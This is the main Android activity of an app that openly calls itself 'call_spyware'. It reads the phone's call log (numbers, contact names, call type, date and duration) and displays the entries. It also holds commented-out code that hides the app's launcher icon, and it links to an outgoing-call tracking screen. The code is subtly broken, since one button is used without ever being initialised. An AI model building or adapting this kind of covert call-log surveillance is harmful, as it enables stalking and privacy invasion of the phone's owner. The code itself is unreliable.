package com.ngpmbewetu.call_spyware;

import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.util.Date;

public class MainActivity extends AppCompatActivity {
    String phNumber,callType,callDate,callDuration,dir;
    Date callDayTime;
    Button button,button2,button3;
    Context context;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        this.context=this;
        button=(Button)findViewById(R.id.button);
        button2=(Button)findViewById(R.id.button2);
       // LastCall();

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
               userReg();

            }
        });

        button2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
//                PackageManager packageManager= getPackageManager();
//                ComponentName compoentName= new ComponentName(MainActivity.this,MainActivity.class);
//                packageManager.setComponentEnabledSetting(compoentName
//                , PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);
            }
        });

        button3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent= new Intent(MainActivity.this,TrackOutgoingCalls.class);
                startActivity(intent);
            }
        });



    }

    private String getCallDetails() {

        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
       // String name = managedCursor.getString(Integer.parseInt(CallLog.Calls.CACHED_NAME));
        sb.append("Call Details :");
        while (managedCursor.moveToNext()) {
             phNumber = managedCursor.getString(number);
             callType = managedCursor.getString(type);
             callDate = managedCursor.getString(date);
             callDayTime = new Date(Long.valueOf(callDate));
            callDuration = managedCursor.getString(duration);
             dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
           // Toast.makeText(this, ""+name, Toast.LENGTH_SHORT).show();
            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");
            Toast.makeText(this, ""+phNumber+" "+dir+" "+callDayTime+" "+callDuration, Toast.LENGTH_SHORT).show();
            userReg();
        }
        managedCursor.close();
        return sb.toString();

    }
    public String LastCall() {
        StringBuffer sb = new StringBuffer();

        @SuppressLint("MissingPermission") Cursor cur = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC");

        int number = cur.getColumnIndex( CallLog.Calls.NUMBER );
        int duration = cur.getColumnIndex( CallLog.Calls.DURATION);
        int type = cur.getColumnIndex(CallLog.Calls.TYPE);
        int date = cur.getColumnIndex(CallLog.Calls.DATE);
        int name = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
        sb.append("Call Details : \n");
        while (cur.moveToNext()) {
            String phNumber = cur.getString( number );
            String callDuration = cur.getString( duration );
            String nm=cur.getString(name);

            Toast.makeText(context, ""+callDuration, Toast.LENGTH_SHORT).show();
            Toast.makeText(context, ""+phNumber, Toast.LENGTH_SHORT).show();
            Toast.makeText(context, ""+nm, Toast.LENGTH_SHORT).show();
            sb.append( "\nPhone Number:"+phNumber);

            break;
        }
        cur.close();
        String str=sb.toString();
        return str;
    }

    public void userReg() {

       Intent intent= new Intent(MainActivity.this,Main2Activity.class);
       startActivity(intent);


    }
}
